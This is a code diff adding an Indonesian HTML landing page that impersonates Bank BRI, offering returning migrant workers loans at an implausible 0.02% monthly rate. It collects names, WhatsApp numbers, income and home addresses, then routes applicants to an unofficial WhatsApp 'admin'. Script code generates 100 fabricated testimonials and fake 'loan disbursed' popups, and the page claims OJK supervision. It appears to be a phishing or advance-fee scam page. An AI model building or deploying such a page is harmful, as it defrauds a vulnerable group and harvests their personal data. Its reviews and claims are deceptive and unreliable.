@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="id" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BRI - Pinjaman Khusus PMI / TKW Bunga 0,02% (30 Juta - 200 Juta)</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Lucide Icons CDN -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
+        
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #f4f7fc;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        input, select, textarea, button {
+            font-size: 16px !important; 
+        }
+
+        .bg-grid-pattern {
+            background-color: #f0f4f9;
+            background-image: linear-gradient(#e2e8f0 1.2px, transparent 1.2px), linear-gradient(90deg, #e2e8f0 1.2px, transparent 1.2px);
+            background-size: 28px 28px;
+            background-position: center;
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.65);
+            justify-content: center;
+            align-items: center;
+            z-index: 50;
+            padding: 16px;
+        }
+    </style>
+</head>
+<body class="text-slate-800 min-h-screen flex flex-col relative selection:bg-[#00529C] selection:text-white">
+
+    <!-- Header / Navbar -->
+    <header class="bg-white/95 backdrop-blur-md sticky top-0 z-40 border-b border-blue-100 shadow-sm animate-fade-in">
+        <nav class="max-w-7xl mx-auto px-4 py-3.5 flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <div class="bg-blue-50 p-1.5 rounded-xl border border-blue-100 shadow-sm">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2e/BRI_2020.svg" alt="Logo BRI" class="h-6 sm:h-7 w-auto hover:scale-105 transition-transform duration-300">
+                </div>
+                <div class="border-l border-slate-200 pl-3">
+                    <h1 class="text-sm sm:text-base font-extrabold text-[#00529C] tracking-tight leading-none">BANK BRI</h1>
+                    <p class="text-[10px] text-slate-500 font-bold mt-1 tracking-wide uppercase">Layanan Resmi PMI & TKW</p>
+                </div>
+            </div>
+            
+            <div class="flex items-center gap-2">
+                <span class="hidden sm:inline-flex items-center gap-1 bg-emerald-50 text-emerald-700 text-[11px] font-bold px-3 py-1.5 rounded-xl border border-emerald-200">
+                    <i data-lucide="shield-check" class="w-3.5 h-3.5"></i> Resmi & Terverifikasi
+                </span>
+                <a href="#kalkulator" class="bg-[#00529C] text-white text-xs font-bold px-4 py-2.5 rounded-xl shadow-md shadow-blue-900/20 active:scale-95 transition-all duration-300 hover:bg-blue-800 hover:shadow-lg">
+                    Ajukan Sekarang
+                </a>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="relative bg-grid-pattern border-b border-blue-100 py-10 sm:py-16 overflow-hidden">
+        <div class="max-w-5xl mx-auto px-4 text-center space-y-6 animate-slide-up">
+            <div class="inline-flex items-center gap-2 bg-blue-100/80 text-[#00529C] px-3.5 py-1.5 rounded-full text-xs font-extrabold uppercase tracking-wider shadow-sm animate-bounce-short">
+                <i data-lucide="award" class="w-4 h-4"></i>
+                Program Khusus Purna Migran Plafond Rp 30 Juta - Rp 200 Juta
+            </div>
+            
+            <h2 class="text-2xl sm:text-4xl md:text-5xl font-black text-slate-900 leading-tight tracking-tight">
+                Wujudkan Usaha Mandiri di Kampung <br class="hidden sm:inline"/>
+                <span class="text-[#00529C] underline decoration-orange-400 decoration-wavy inline-block mt-1">Bunga Ringan Hanya 0,02%</span>
+            </h2>
+            
+            <p class="text-slate-600 text-xs sm:text-sm md:text-base leading-relaxed max-w-2xl mx-auto font-medium">
+                Solusi pembiayaan terpercaya bagi purna Pekerja Migran Indonesia (PMI/TKW). Proses cepat, transparan, tanpa biaya admin di depan, dan tenor cicilan fleksibel hingga 5 tahun.
+            </p>
+
+            <!-- Banner Slider -->
+            <div class="max-w-2xl mx-auto mt-6 relative rounded-3xl overflow-hidden shadow-xl border border-blue-200/80 bg-white h-52 sm:h-64">
+                <div id="heroSlider" class="relative w-full h-full flex transition-transform duration-700 ease-in-out">
+                    <!-- Slide 1 -->
+                    <div class="w-full h-full flex-shrink-0 relative">
+                        <img src="https://images.unsplash.com/photo-1542838132-92c53300491e?auto=format&fit=crop&w=1000&q=80" alt="Usaha Toko Sembako" class="w-full h-full object-cover">
+                        <div class="absolute inset-0 bg-gradient-to-t from-black/85 via-black/40 to-transparent flex flex-col justify-end p-5 text-left text-white">
+                            <span class="bg-[#00529C] text-white text-[10px] font-extrabold px-3 py-1 rounded-full w-max mb-1 shadow">Peluang Usaha #1</span>
+                            <h3 class="text-base sm:text-lg font-black">Buka Toko Sembako & Kelontong Modern</h3>
+                            <p class="text-xs text-slate-200">Stok barang lengkap siap melayani tetangga dan warga sekitar</p>
+                        </div>
+                    </div>
+                    <!-- Slide 2 -->
+                    <div class="w-full h-full flex-shrink-0 relative">
+                        <img src="https://images.unsplash.com/photo-1555396273-367ea4eb4db5?auto=format&fit=crop&w=1000&q=80" alt="Usaha Kuliner" class="w-full h-full object-cover">
+                        <div class="absolute inset-0 bg-gradient-to-t from-black/85 via-black/40 to-transparent flex flex-col justify-end p-5 text-left text-white">
+                            <span class="bg-[#00529C] text-white text-[10px] font-extrabold px-3 py-1 rounded-full w-max mb-1 shadow">Peluang Usaha #2</span>
+                            <h3 class="text-base sm:text-lg font-black">Kuliner & Warung Makan Sukses</h3>
+                            <p class="text-xs text-slate-200">Kembangkan keahlian memasak luar negeri menjadi bisnis kuliner laris</p>
+                        </div>
+                    </div>
+                    <!-- Slide 3 -->
+                    <div class="w-full h-full flex-shrink-0 relative">
+                        <img src="https://images.unsplash.com/photo-1500937386664-56d1dfef3854?auto=format&fit=crop&w=1000&q=80" alt="Pertanian Modern" class="w-full h-full object-cover">
+                        <div class="absolute inset-0 bg-gradient-to-t from-black/85 via-black/40 to-transparent flex flex-col justify-end p-5 text-left text-white">
+                            <span class="bg-[#00529C] text-white text-[10px] font-extrabold px-3 py-1 rounded-full w-max mb-1 shadow">Peluang Usaha #3</span>
+                            <h3 class="text-base sm:text-lg font-black">Investasi Lahan & Pertanian Modern</h3>
+                            <p class="text-xs text-slate-200">Produktifkan hasil kerja keras merantau untuk masa depan keluarga</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Slider Dots -->
+                <div class="absolute bottom-3 right-4 flex gap-1.5 z-10 bg-black/30 backdrop-blur-sm px-2.5 py-1.5 rounded-full">
+                    <button type="button" class="slider-dot w-6 h-2 rounded-full bg-white transition-all" data-index="0"></button>
+                    <button type="button" class="slider-dot w-2 h-2 rounded-full bg-white/60 transition-all" data-index="1"></button>
+                    <button type="button" class="slider-dot w-2 h-2 rounded-full bg-white/60 transition-all" data-index="2"></button>
+                </div>
+            </div>
+
+            <!-- Highlights -->
+            <div class="grid grid-cols-3 gap-3 max-w-lg mx-auto pt-2">
+                <div class="bg-white p-3 rounded-2xl border border-blue-100 shadow-sm text-center transition-all duration-300 hover:-translate-y-1 hover:shadow-md">
+                    <div class="text-[10px] text-slate-500 font-bold uppercase">Suku Bunga</div>
+                    <div class="text-sm sm:text-base font-black text-[#00529C] mt-0.5">0,02% / Bln</div>
+                </div>
+                <div class="bg-white p-3 rounded-2xl border border-blue-100 shadow-sm text-center transition-all duration-300 hover:-translate-y-1 hover:shadow-md">
+                    <div class="text-[10px] text-slate-500 font-bold uppercase">Plafond Dana</div>
+                    <div class="text-sm sm:text-base font-black text-slate-900 mt-0.5">30 - 200 Juta</div>
+                </div>
+                <div class="bg-white p-3 rounded-2xl border border-blue-100 shadow-sm text-center transition-all duration-300 hover:-translate-y-1 hover:shadow-md">
+                    <div class="text-[10px] text-slate-500 font-bold uppercase">Tenor Cicilan</div>
+                    <div class="text-sm sm:text-base font-black text-slate-900 mt-0.5">1 - 5 Tahun</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Main Content Area -->
+    <main class="max-w-7xl mx-auto px-4 py-10 flex-grow w-full space-y-12">
+
+        <!-- Calculator & Form Section -->
+        <div id="kalkulator" class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+            
+            <!-- LEFT: Kalkulator -->
+            <div class="lg:col-span-5 bg-white p-6 sm:p-8 rounded-3xl border border-slate-200/80 shadow-sm space-y-6 transition-all duration-300 hover:shadow-md">
+                <div class="flex items-center gap-3 border-b border-slate-100 pb-4">
+                    <div class="p-3 bg-blue-50 text-[#00529C] rounded-2xl shadow-sm">
+                        <i data-lucide="calculator" class="w-6 h-6"></i>
+                    </div>
+                    <div>
+                        <h3 class="text-lg font-extrabold text-slate-900">Kalkulator Simulasi Angsuran</h3>
+                        <p class="text-xs text-slate-500 font-medium">Rentang Plafond: Rp 30 Juta s.d Rp 200 Juta</p>
+                    </div>
+                </div>
+
+                <!-- Input Nominal Range -->
+                <div class="space-y-3">
+                    <div class="flex justify-between items-end">
+                        <label class="text-xs font-extrabold uppercase tracking-wider text-slate-600">Jumlah Pinjaman</label>
+                        <span id="amountDisplay" class="text-xl sm:text-2xl font-black text-[#00529C] transition-all duration-300">Rp 30.000.000</span>
+                    </div>
+                    <input type="range" id="loanAmount" min="30000000" max="200000000" step="5000000" value="30000000"
+                        class="w-full h-3 bg-slate-100 rounded-lg appearance-none cursor-pointer accent-[#00529C] transition-all">
+                    <div class="flex justify-between text-[11px] font-bold text-slate-400">
+                        <span>Rp 30 Juta (Min)</span>
+                        <span>Rp 200 Juta (Max)</span>
+                    </div>
+                </div>
+
+                <!-- Input Tenor (1 - 5 Tahun) -->
+                <div class="space-y-3">
+                    <label class="text-xs font-extrabold uppercase tracking-wider text-slate-600 block">Pilih Jangka Waktu (Tenor)</label>
+                    <div class="grid grid-cols-5 gap-2" id="tenorContainer">
+                        <button type="button" data-years="1" data-months="12" class="tenor-btn py-2.5 px-1 rounded-xl border text-xs font-bold flex flex-col items-center justify-center border-slate-200 text-slate-700 transition-all duration-200 hover:border-[#00529C]">
+                            <span>1 Thn</span>
+                        </button>
+                        <button type="button" data-years="2" data-months="24" class="tenor-btn py-2.5 px-1 rounded-xl border text-xs font-bold flex flex-col items-center justify-center border-slate-200 text-slate-700 transition-all duration-200 hover:border-[#00529C]">
+                            <span>2 Thn</span>
+                        </button>
+                        <button type="button" data-years="3" data-months="36" class="tenor-btn active py-2.5 px-1 rounded-xl border text-xs font-bold flex flex-col items-center justify-center bg-[#00529C] text-white border-[#00529C] shadow-md transition-all duration-200">
+                            <span>3 Thn</span>
+                        </button>
+                        <button type="button" data-years="4" data-months="48" class="tenor-btn py-2.5 px-1 rounded-xl border text-xs font-bold flex flex-col items-center justify-center border-slate-200 text-slate-700 transition-all duration-200 hover:border-[#00529C]">
+                            <span>4 Thn</span>
+                        </button>
+                        <button type="button" data-years="5" data-months="60" class="tenor-btn py-2.5 px-1 rounded-xl border text-xs font-bold flex flex-col items-center justify-center border-slate-200 text-slate-700 transition-all duration-200 hover:border-[#00529C]">
+                            <span>5 Thn</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Result Box -->
+                <div class="p-5 rounded-2xl bg-gradient-to-br from-blue-50 to-blue-100/60 border border-blue-200 space-y-3 shadow-inner">
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs font-bold text-slate-600">Estimasi Cicilan / Bulan</span>
+                        <span id="monthlyResult" class="text-xl sm:text-2xl font-black text-[#00529C] transition-all duration-300">Rp 833.333</span>
+                    </div>
+                    <div class="pt-2 border-t border-blue-200/80 flex justify-between text-xs font-medium">
+                        <span class="text-slate-500">Suku Bunga Khusus:</span>
+                        <span class="font-extrabold text-blue-900">0,02% / Bulan (Tetap)</span>
+                    </div>
+                </div>
+
+                <!-- Skema Select -->
+                <div class="space-y-2">
+                    <label class="text-xs font-extrabold uppercase tracking-wider text-slate-600 block">Pilih Skema Pembiayaan</label>
+                    <select id="schemeSelect" class="w-full px-4 py-3 text-xs font-bold bg-slate-50 border border-slate-200 rounded-xl outline-none focus:border-[#00529C] focus:bg-white transition-all shadow-sm">
+                        <option value="Kredit Purna PMI / TKW BRI 0,02%">Kredit Purna PMI / TKW BRI (Bunga 0,02%)</option>
+                        <option value="Kupedes BRI Mikro">Kupedes BRI Mikro</option>
+                        <option value="Kredit Usaha Rakyat (KUR) BRI">Kredit Usaha Rakyat (KUR) BRI</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- RIGHT: Form Pengajuan -->
+            <div class="lg:col-span-7 bg-white p-6 sm:p-8 rounded-3xl border border-slate-200/80 shadow-sm space-y-6 transition-all duration-300 hover:shadow-md">
+                <div class="flex items-center gap-3 border-b border-slate-100 pb-4">
+                    <div class="p-3 bg-blue-50 text-[#00529C] rounded-2xl shadow-sm">
+                        <i data-lucide="file-text" class="w-6 h-6"></i>
+                    </div>
+                    <div>
+                        <h3 class="text-lg font-extrabold text-slate-900">Formulir Pengajuan Resmi</h3>
+                        <p class="text-xs text-slate-500 font-medium">Lengkapi data domisili, keuangan, & tujuan pinjaman Anda</p>
+                    </div>
+                </div>
+
+                <!-- Warning Banner -->
+                <div class="p-4 bg-amber-50 border border-amber-200 rounded-2xl space-y-2 text-xs text-amber-900 shadow-sm">
+                    <div class="flex items-center gap-2 font-black text-amber-950">
+                        <i data-lucide="shield-alert" class="w-4 h-4 text-amber-600 flex-shrink-0 animate-bounce"></i>
+                        <span>PERHATIAN & PENTING TERKAIT KEAMANAN!</span>
+                    </div>
+                    <p class="leading-relaxed text-[11px] font-medium">
+                        Bank BRI <strong>TIDAK PERNAH</strong> memungut biaya administrasi atau uang muka di awal sebelum pinjaman disetujui & dicairkan. Pastikan data diisi dengan valid!
+                    </p>
+                </div>
+
+                <form id="loanApplicationForm" class="space-y-4">
+                    <!-- Data Pribadi -->
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-xs font-bold uppercase tracking-wider text-slate-600 mb-1.5">Nama Lengkap (Sesuai KTP) *</label>
+                            <input type="text" id="applicantName" required placeholder="Contoh: Siti Aisyah"
+                                class="w-full px-4 py-3 text-sm bg-slate-50 border border-slate-200 rounded-xl outline-none focus:border-[#00529C] focus:bg-white transition-all shadow-sm">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-bold uppercase tracking-wider text-slate-600 mb-1.5">No. WhatsApp Aktif *</label>
+                            <input type="tel" id="applicantPhone" required placeholder="081234567890"
+                                class="w-full px-4 py-3 text-sm bg-slate-50 border border-slate-200 rounded-xl outline-none focus:border-[#00529C] focus:bg-white transition-all shadow-sm">
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-xs font-bold uppercase tracking-wider text-slate-600 mb-1.5">Negara Asal Kerja Migran *</label>
+                            <input type="text" id="applicantJob" required placeholder="Taiwan / Hong Kong / Malaysia / dll"
+                                class="w-full px-4 py-3 text-sm bg-slate-50 border border-slate-200 rounded-xl outline-none focus:border-[#00529C] focus:bg-white transition-all shadow-sm">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-bold uppercase tracking-wider text-slate-600 mb-1.5">Perkiraan Penghasilan / Bulan *</label>
+                            <select id="applicantIncome" required class="w-full px-4 py-3 text-sm bg-slate-50 border border-slate-200 rounded-xl outline-none focus:border-[#00529C] focus:bg-white transition-all shadow-sm">
+                                <option value="" disabled selected>Pilih Kisaran Penghasilan</option>
+                                <option value="< Rp 5 Juta">&lt; Rp 5 Juta / Bulan</option>
+                                <option value="Rp 5 Juta - Rp 10 Juta">Rp 5 Juta - Rp 10 Juta / Bulan</option>
+                                <option value="Rp 10 Juta - Rp 20 Juta">Rp 10 Juta - Rp 20 Juta / Bulan</option>
+                                <option value="> Rp 20 Juta">&gt; Rp 20 Juta / Bulan</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <!-- Alamat Domisili -->
+                    <div class="space-y-3 pt-3 border-t border-slate-100">
+                        <label class="block text-xs font-extrabold uppercase tracking-wider text-[#00529C]">Detail Alamat Domisili di Indonesia</label>
+                        
+                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-[11px] font-bold text-slate-500 mb-1">Provinsi *</label>
+                                <input type="text" id="applicantProvince" required placeholder="Contoh: Jawa Barat"
+                                    class="w-full px-4 py-2.5 text-xs bg-slate-50 border border-slate-200 rounded-xl outline-none focus:border-[#00529C] focus:bg-white transition-all shadow-sm">
+                            </div>
+                            <div>
+                                <label class="block text-[11px] font-bold text-slate-500 mb-1">Kabupaten / Kota *</label>
+                                <input type="text" id="applicantCity" required placeholder="Contoh: Kab. Indramayu"
+                                    class="w-full px-4 py-2.5 text-xs bg-slate-50 border border-slate-200 rounded-xl outline-none focus:border-[#00529C] focus:bg-white transition-all shadow-sm">
+                            </div>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-4">
+                            <div>
+                                <label class="block text-[11px] font-bold text-slate-500 mb-1">Kecamatan *</label>
+                                <input type="text" id="applicantDistrict" required placeholder="Contoh: Jatibarang"
+                                    class="w-full px-4 py-2.5 text-xs bg-slate-50 border border-slate-200 rounded-xl outline-none focus:border-[#00529C] focus:bg-white transition-all shadow-sm">
+                            </div>
+                            <div>
+                                <label class="block text-[11px] font-bold text-slate-500 mb-1">Desa / Kelurahan & RT/RW *</label>
+                                <input type="text" id="applicantVillage" required placeholder="Desa Bulak, RT 02/01"
+                                    class="w-full px-4 py-2.5 text-xs bg-slate-50 border border-slate-200 rounded-xl outline-none focus:border-[#00529C] focus:bg-white transition-all shadow-sm">
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Tujuan Peminjaman -->
+                    <div class="space-y-2 pt-3 border-t border-slate-100">
+                        <label class="block text-xs font-extrabold uppercase tracking-wider text-[#00529C]">Tujuan Peminjaman & Rencana Usaha *</label>
+                        <select id="loanPurpose" required class="w-full px-4 py-3 text-sm bg-slate-50 border border-slate-200 rounded-xl outline-none focus:border-[#00529C] focus:bg-white transition-all shadow-sm">
+                            <option value="" disabled selected>Pilih Tujuan Utama Peminjaman</option>
+                            <option value="Buka Toko Sembako / Kelontong">Buka Toko Sembako / Kelontong</option>
+                            <option value="Buka Usaha Kuliner / Warung Makan">Buka Usaha Kuliner / Warung Makan</option>
+                            <option value="Modal Pertanian / Perkebunan / Peternakan">Modal Pertanian / Perkebunan / Peternakan</option>
+                            <option value="Buka Salon Kecantikan / Pangkas Rambut">Buka Salon Kecantikan / Pangkas Rambut</option>
+                            <option value="Buka Usaha Konveksi / Jahit Pakaian">Buka Usaha Konveksi / Jahit Pakaian</option>
+                            <option value="Pengembangan Usaha Dagang Lainnya">Pengembangan Usaha Dagang Lainnya</option>
+                        </select>
+                    </div>
+
+                    <!-- Ringkasan Info -->
+                    <div class="p-3.5 bg-slate-50 rounded-2xl border border-slate-200 text-xs space-y-1.5 shadow-sm">
+                        <div class="flex justify-between">
+                            <span class="text-slate-500 font-medium">Plafond Dipilih:</span>
+                            <span id="formAmountText" class="font-black text-slate-900">Rp 30.000.000</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-slate-500 font-medium">Tenor Cicilan:</span>
+                            <span id="formTenorText" class="font-black text-slate-900">3 Tahun</span>
+                        </div>
+                    </div>
+
+                    <button type="submit"
+                        class="w-full bg-[#00529C] hover:bg-blue-800 text-white font-extrabold py-4 px-6 rounded-2xl shadow-xl shadow-blue-900/20 flex items-center justify-center gap-2 text-xs uppercase tracking-wider active:scale-[0.98] transition-all duration-300 group">
+                        <i data-lucide="send" class="w-4 h-4 transition-transform group-hover:translate-x-1"></i>
+                        Ajukan & Hubungkan ke WhatsApp
+                    </button>
+                </form>
+            </div>
+
+        </div>
+
+        <!-- SECTION: TESTIMONI TKW (100 TESTIMONI) -->
+        <section class="py-8">
+            <div class="text-center mb-8">
+                <span class="text-xs font-extrabold text-[#00529C] bg-blue-50 border border-blue-200 px-3.5 py-1.5 rounded-full uppercase tracking-wider inline-block shadow-sm">
+                    Kisah Sukses Nyata Purna PMI & TKW
+                </span>
+                <h3 class="text-2xl font-black text-slate-900 mt-3">Mereka yang Sukses Membangun Usaha di Kampung</h3>
+                <p class="text-xs sm:text-sm text-slate-500 mt-1">Menampilkan 100 ulasan dari para purna migran di seluruh wilayah Indonesia</p>
+            </div>
+
+            <!-- Container Grid 100 Testimoni -->
+            <div id="testimonialGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 max-h-[650px] overflow-y-auto p-3 pr-2 border border-slate-200/80 rounded-3xl bg-white shadow-inner">
+                <!-- Data 100 testimoni di-generate via JavaScript -->
+            </div>
+        </section>
+
+    </main>
+
+    <!-- POP-UP MODAL BERHASIL -->
+    <div id="successModal" class="modal-overlay">
+        <div class="bg-white p-7 rounded-3xl max-w-sm w-full shadow-2xl border border-blue-100 text-center space-y-5 modal-content transform scale-95 opacity-0 transition-all duration-300 ease-out">
+            <div class="flex justify-center mb-1">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2e/BRI_2020.svg" alt="Logo BRI" class="h-9 w-auto">
+            </div>
+
+            <div class="w-14 h-14 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto shadow-inner">
+                <i data-lucide="check" class="w-7 h-7 stroke-[3]"></i>
+            </div>
+
+            <div class="space-y-1.5">
+                <h3 class="text-lg font-black text-slate-900">Pengajuan Berhasil Disimpan!</h3>
+                <p class="text-xs text-slate-500 leading-relaxed font-medium">Data Anda telah tercatat dengan aman. Silakan klik tombol di bawah untuk melanjutkan verifikasi persyaratan ke WhatsApp Resmi Admin BRI.</p>
+            </div>
+
+            <a id="waBtn" href="#" target="_blank"
+                class="w-full bg-[#25D366] hover:bg-[#20ba5a] text-white font-extrabold py-3.5 px-4 rounded-2xl shadow-lg shadow-emerald-600/20 flex items-center justify-center gap-2 text-xs uppercase tracking-wider transition-all duration-300 hover:scale-[1.02]">
+                <i data-lucide="message-circle" class="w-4 h-4"></i>
+                Lanjutkan ke WhatsApp
+            </a>
+
+            <button type="button" id="closeModalBtn" class="text-xs font-bold text-slate-400 hover:text-slate-600 pt-1 block mx-auto transition-colors">
+                Tutup / Kembali
+            </button>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-white border-t border-slate-200 py-8 mt-12 text-center text-xs text-slate-400 font-medium">
+        <div class="max-w-7xl mx-auto px-4 space-y-2">
+            <p>&copy; 2026 PT Bank Rakyat Indonesia (Persero) Tbk. Program Pembiayaan Khusus Purna PMI & TKW.</p>
+            <p class="text-[11px] text-slate-400">Diawasi oleh Otoritas Jasa Keuangan (OJK) & Lembaga Penjamin Simpanan (LPS).</p>
+        </div>
+    </footer>
+
+    <!-- LIVE NOTIFICATION POPUP -->
+    <div id="liveNotification" class="fixed top-20 right-4 z-50 transform translate-x-32 opacity-0 transition-all duration-500 ease-out max-w-xs sm:max-w-sm bg-white/95 backdrop-blur-md border border-emerald-300 shadow-2xl rounded-2xl p-3.5 flex items-center gap-3">
+        <div class="w-10 h-10 rounded-xl bg-emerald-100 text-emerald-600 flex items-center justify-center flex-shrink-0 shadow-sm">
+            <i data-lucide="check-circle-2" class="w-6 h-6"></i>
+        </div>
+        <div class="flex-grow min-w-0">
+            <div class="flex items-center justify-between">
+                <span id="notifName" class="text-xs font-black text-slate-900 truncate">Siti Aisyah (Indramayu)</span>
+                <span class="text-[9px] font-bold text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded-full">Baru Saja</span>
+            </div>
+            <p id="notifText" class="text-[11px] text-slate-600 truncate mt-0.5 font-medium">Berhasil mencairkan pinjaman Rp 75.000.000</p>
+        </div>
+        <button type="button" id="closeNotif" class="text-slate-400 hover:text-slate-600 p-1 flex-shrink-0 transition-colors">
+            <i data-lucide="x" class="w-3.5 h-3.5"></i>
+        </button>
+    </div>
+
+    <style>
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes bounceShort {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-4px); }
+        }
+        .animate-fade-in {
+            animation: fadeIn 0.6s ease-out forwards;
+        }
+        .animate-slide-up {
+            animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+        }
+        .animate-bounce-short {
+            animation: bounceShort 2s infinite;
+        }
+    </style>
+
+    <script>
+        lucide.createIcons();
+
+        // 100 Testimoni Data Generator
+        const firstNames = ["Siti", "Rini", "Marlina", "Yanti", "Dwi", "Sri", "Nurul", "Endang", "Lilis", "Rina", "Fatimah", "Mimin", "Hesti", "Ani", "Wati", "Tati", "Nining", "Siti", "Euis", "Yati", "Rosa", "Fitri", "Dewi", "Kusmiati", "Aminah", "Suci", "Ratna", "Wahyuni", "Nurjanah", "Indah"];
+        const lastNames = ["Wahyuni", "Indriyani", "Rosita", "Nuraeni", "Susanti", "Utami", "Rahmawati", "Kusuma", "Mulyani", "Trisnawati", "Indah", "Nuraeni", "Setyawati", "Nurhayati", "Kartika", "Rahmawati", "Nurjanah", "Purnamasari", "Rostika", "Indrawati"];
+        const countries = ["Taiwan", "Hong Kong", "Malaysia", "Singapura", "Brunei", "Abu Dhabi", "Arab Saudi"];
+        const reviewTexts = [
+            "Alhamdulillah berkat pinjaman BRI ini, saya bisa buka toko sembako di kampung setelah kontrak habis. Prosesnya dibantu lewat WA sampai cair!",
+            "Sempat khawatir ngajuin pas baru pulang, ternyata gampang banget. Bunganya super ringan 0,02%, cicilan sangat pas untuk modal usaha.",
+            "Pelayanan admin WhatsApp-nya ramah dan cepat tanggap. Dana cair buat modal kebun keluarga. Terima kasih Bank BRI!",
+            "Tabungan hasil kerja di luar negeri ditambah pinjaman BRI bunga 0,02% bikin usaha kuliner saya berkembang pesat sekarang.",
+            "Awalnya ragu ngisi form online, ternyata beneran dihubungi admin resmi BRI. Proses cepat dan sangat membantu purna migran.",
+            "Bunga 0,02% sangat transparan dan cicilannya pas dengan omset usaha toko kelontong saya.",
+            "Syarat KTP dan paspor lama langsung diproses lancar. Sekarang usaha jahit konveksi di rumah sudah jalan 1 tahun.",
+            "Terima kasih Bank BRI atas program purna PMI. Sangat meringankan kami yang baru pulang merantau bertahun-tahun.",
+            "Plafond besar cair tanpa kendala untuk modal perluasan minimarket desa kami.",
+            "Mantap! Mengisi form lewat website ini sangat praktis, langsung terhubung ke WhatsApp resmi BRI."
+        ];
+
+        const testimonialGrid = document.getElementById('testimonialGrid');
+        let cardsHTML = '';
+        for (let i = 0; i < 100; i++) {
+            const fName = firstNames[i % firstNames.length];
+            const lName = lastNames[(i * 3) % lastNames.length];
+            const country = countries[i % countries.length];
+            const plafond = 35 + ((i * 15) % 150);
+            const review = reviewTexts[i % reviewTexts.length];
+            const initials = `${fName[0]}${lName[0]}`;
+
+            cardsHTML += `
+                <div class="bg-slate-50/80 border border-slate-200/80 p-4 rounded-2xl shadow-sm flex flex-col justify-between transform transition-all duration-300 hover:-translate-y-1 hover:shadow-md hover:border-blue-200 hover:bg-white">
+                    <div>
+                        <div class="flex items-center gap-3 mb-3">
+                            <div class="w-9 h-9 rounded-full bg-blue-100 text-[#00529C] font-black flex items-center justify-center text-xs flex-shrink-0 shadow-sm">${initials}</div>
+                            <div>
+                                <h4 class="text-xs font-extrabold text-slate-900">${fName} ${lName}</h4>
+                                <p class="text-[10px] text-slate-500 font-semibold">Eks TKW ${country} • Plafond ${plafond} Juta</p>
+                            </div>
+                        </div>
+                        <p class="text-[11px] text-slate-600 leading-relaxed font-medium">
+                            "${review}"
+                        </p>
+                    </div>
+                    <div class="flex text-amber-400 mt-3 text-[10px] gap-0.5">⭐⭐⭐⭐⭐</div>
+                </div>
+            `;
+        }
+        testimonialGrid.innerHTML = cardsHTML;
+
+        // Calculator State
+        let selectedYears = 3;
+        let selectedMonths = 36;
+
+        const loanAmountInput = document.getElementById('loanAmount');
+        const amountDisplay = document.getElementById('amountDisplay');
+        const monthlyResult = document.getElementById('monthlyResult');
+        
+        const formAmountText = document.getElementById('formAmountText');
+        const formTenorText = document.getElementById('formTenorText');
+
+        const tenorButtons = document.querySelectorAll('.tenor-btn');
+        const loanApplicationForm = document.getElementById('loanApplicationForm');
+        const schemeSelect = document.getElementById('schemeSelect');
+
+        const successModal = document.getElementById('successModal');
+        const modalContent = successModal.querySelector('.modal-content');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+        const waBtn = document.getElementById('waBtn');
+
+        function formatRupiah(amount) {
+            return new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', maximumFractionDigits: 0 }).format(amount);
+        }
+
+        function updateCalculator() {
+            const amount = parseInt(loanAmountInput.value) || 30000000;
+            const monthlyInterestRate = 0.0002; // 0.02% per bulan
+            
+            const principalPerMonth = amount / selectedMonths;
+            const interestPerMonth = amount * monthlyInterestRate;
+            const monthlyPayment = Math.round(principalPerMonth + interestPerMonth);
+
+            const formattedAmount = formatRupiah(amount);
+            const formattedMonthly = formatRupiah(monthlyPayment);
+
+            amountDisplay.innerText = formattedAmount;
+            monthlyResult.innerText = formattedMonthly;
+
+            formAmountText.innerText = formattedAmount;
+            formTenorText.innerText = `${selectedYears} Tahun (${selectedMonths} Bulan)`;
+        }
+
+        loanAmountInput.addEventListener('input', updateCalculator);
+
+        tenorButtons.forEach(btn => {
+            btn.addEventListener('click', () => {
+                tenorButtons.forEach(b => {
+                    b.classList.remove('bg-[#00529C]', 'text-white', 'border-[#00529C]', 'shadow-md');
